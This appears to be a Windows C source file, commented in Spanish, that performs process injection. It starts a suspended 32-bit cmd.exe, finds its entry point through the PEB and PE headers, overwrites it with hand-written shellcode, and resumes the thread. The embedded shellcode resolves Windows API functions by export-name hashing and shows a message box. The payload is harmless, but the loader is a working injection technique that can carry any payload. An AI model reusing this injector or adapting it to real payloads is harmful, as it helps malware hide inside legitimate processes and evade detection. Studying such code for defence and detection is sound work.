#include <stdio.h>
#include <stdint.h>
#include <windows.h>
#include <winternl.h>



typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

// Función para leer un QWORD desde una dirección del proceso hijo
uint64_t ReadRemoteQWord(void* hProcess, void* address) {
    uint64_t value = 0;
    SIZE_T bytesRead;
    
    if (ReadProcessMemory(hProcess, address, &value, sizeof(value), &bytesRead)) {
        return value;
    }
    printf("Error leyendo DWORD en 0x%p: %d\n", address, GetLastError());
    return 0;
}

// Función para leer un DWORD desde una dirección del proceso hijo
uint32_t ReadRemoteDWord(void* hProcess, void* address) {
    uint32_t value = 0;
    SIZE_T bytesRead;
    
    if (ReadProcessMemory(hProcess, address, &value, sizeof(value), &bytesRead)) {
        return value;
    }
    printf("Error leyendo DWORD en 0x%p: %d\n", address, GetLastError());
    return 0;
}

int main(void) {
    STARTUPINFOW si = {0};          // Estructura para configurar hijo
    PROCESS_INFORMATION pi = {0};   // Cuando llamas a CreateProcessW, Windows rellena esta estructura
    si.cb = sizeof(si);             // Windows lo utiliza para saber qué versión de la estructura le estás pasando

    BOOL result = 
        CreateProcessA(
            NULL,               // lpApplicationName
            "C:\\Windows\\SysWOW64\\cmd.exe",          // lpCommandLine
            NULL,               // lpProcessAttributes
            NULL,               // lpThreadAttributes
            FALSE,              // bInheritHandles
            CREATE_SUSPENDED,   // dwCreationFlags -> hilo principal creado suspendido
            NULL,               // lpEnvironment
            NULL,               // lpCurrentDirectory
            &si,                // lpStartupInfo
            &pi                 // lpProcessInformation
        );

    if (!result) { // Si devuevle una valor mayor a 0 hay un error
        wprintf(L"CreateProcessA failed: %u\n", GetLastError());
        return 1;
    }

    // Obtener dirección de NtQueryInformationProcess
    pNtQueryInformationProcess NtQueryInformationProcess = 
        (pNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");


    if (!NtQueryInformationProcess) {
        printf("Error obteniendo NtQueryInformationProcess\n");
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    // Consultar información del proceso
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;

    NTSTATUS status = NtQueryInformationProcess(
        pi.hProcess,                    // Handle del proceso
        ProcessBasicInformation,        // Clase de información
        &pbi,                           // Buffer de salida
        sizeof(pbi),                    // Tamaño del buffer
        &returnLength                   // Longitud retornada
    );

    if (status != 0) {
        printf("Error en NtQueryInformationProcess: 0x%X\n", status);
        return 1;
    }

    printf("PROCESS_BASIC_INFORMATION:\n");
    printf("  Reserved1: 0x%p\n", pbi.Reserved1);
    printf("  PebBaseAddress: 0x%p\n", pbi.PebBaseAddress);
    printf("  Reserved2[0]: 0x%p\n", pbi.Reserved2[0]);
    printf("  Reserved2[1]: 0x%p\n", pbi.Reserved2[1]);
    printf("  UniqueProcessId: %llu (0x%llX)\n", (ULONGLONG)pbi.UniqueProcessId, (ULONGLONG)pbi.UniqueProcessId);
    printf("  Reserved3: 0x%p\n", pbi.Reserved3);

    // Cuidado con la aritmetica de punteros
    uint64_t ImageBaseAddress = ReadRemoteQWord(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 0x10);
    uint32_t e_lfanew = ReadRemoteDWord(pi.hProcess, ImageBaseAddress + 0x3c);
    uint32_t RvaAddressOfEntryPoint = ReadRemoteDWord(pi.hProcess, (void*)(ImageBaseAddress + e_lfanew + 0x18 + 0x10));
    void* AddressOfEntryPoint = ImageBaseAddress + RvaAddressOfEntryPoint;

    printf("ImageBaseAddress: 0x%llX \n", ImageBaseAddress);
    printf("AddressOfEntryPoint: %p\n", AddressOfEntryPoint);
    
    unsigned char shellcode[] = 
        "\xe8\x00\x00\x00\x00\x5a\x8d\x52\xfb\x55\x89\xe5\x83\xec\x10\x52\x8b\x82\x7c\x01"
        "\x00\x00\x50\xe8\xf0\x00\x00\x00\x89\x45\xfc\x83\xc4\x04\x5a\x52\x8d\x45\xf0\x50"
        "\x8d\x82\x97\x01\x00\x00\x50\x8b\x45\xfc\x50\xe8\x10\x01\x00\x00\x83\xc4\x0c\x5a"
        "\x52\x8d\x9a\x80\x01\x00\x00\x53\x8b\x45\xf0\xff\xd0\x89\x45\xf8\x5a\x52\x8d\x82"
        "\x8b\x01\x00\x00\x50\x8b\x45\xf8\x50\xff\x55\xf4\x89\xc0\x5a\x6a\x00\x6a\x00\x6a"
        "\x00\x6a\x00\xff\xd0\x89\xec\x5d\xc3\x8b\x54\x24\x04\x31\xc0\x8a\x1a\x80\xfb\x00"
        "\x74\x1b\x80\xfb\x41\x72\x08\x80\xfb\x5a\x77\x03\x80\xcb\x20\xc1\xc0\x07\x0f\xb6"
        "\xdb\x31\xd8\x03\x54\x24\x08\xeb\xde\x5a\x83\xc4\x08\x52\xc3\x55\x89\xe5\x83\xec"
        "\x0c\x8b\x5d\x08\x8b\x73\x3c\x8d\x34\x33\x8d\x76\x78\x8b\x36\x8d\x34\x33\x8b\x7e"
        "\x20\x8d\x3c\x3b\x89\x7d\xfc\x8b\x7e\x1c\x8d\x3c\x3b\x89\x7d\xf4\x8b\x7e\x24\x8d"
        "\x3c\x3b\x89\x7d\xf8\x31\xc9\x8b\x55\xfc\x8d\x14\x8a\x8b\x12\x8b\x5d\x08\x8d\x14"
        "\x13\x6a\x01\x52\xe8\x88\xff\xff\xff\x3b\x45\x0c\x74\x05\x83\xc1\x01\x75\xe0\x8b"
        "\x55\xf8\x8d\x14\x4a\x31\xc0\x66\x8b\x02\x8b\x55\xf4\x8d\x14\x82\x8b\x12\x8b\x5d"
        "\x08\x8d\x04\x13\x89\xec\x5d\xc3\x55\x89\xe5\x64\x8b\x3d\x30\x00\x00\x00\x8b\x7f"
        "\x0c\x8b\x7f\x0c\x89\xfe\x8b\x56\x30\x6a\x02\x52\xe8\x44\xff\xff\xff\x8b\x5d\x08"
        "\x39\xd8\x74\x08\x8b\x36\x39\xfe\x75\xe8\xeb\x07\x8b\x46\x18\x89\xec\x5d\xc3\xb8"
        "\xff\xff\xff\xff\x89\xec\x5d\xc3\x55\x89\xe5\x31\xc9\x8b\x5d\x0c\x8d\x1c\x8b\x8b"
        "\x1b\x83\xfb\xff\x74\x1c\x51\x53\x8b\x45\x08\x50\xe8\x36\xff\xff\xff\x83\xc4\x08"
        "\x59\x8b\x5d\x10\x8d\x1c\x8b\x89\x03\x83\xc1\x01\xeb\xd7\x89\xc8\x89\xec\x5d\xc3"
        "\x8e\xfe\x1f\x4b\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x4d\x65\x73\x73\x61"
        "\x67\x65\x42\x6f\x78\x41\x00\x06\x80\xe8\xc8\xef\x62\xc0\x1f\xff\xff\xff\xff";
    
    uint64_t bytesRead;
    if (!WriteProcessMemory(pi.hProcess, AddressOfEntryPoint, shellcode, sizeof(shellcode) -1, &bytesRead)) {
        printf("Error inyectando shellcode: %d\n", GetLastError());
        return FALSE;
    }

    DWORD suspendCount = ResumeThread(pi.hThread);

    WaitForSingleObject(pi.hProcess, INFINITE);

    // Limpiar
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}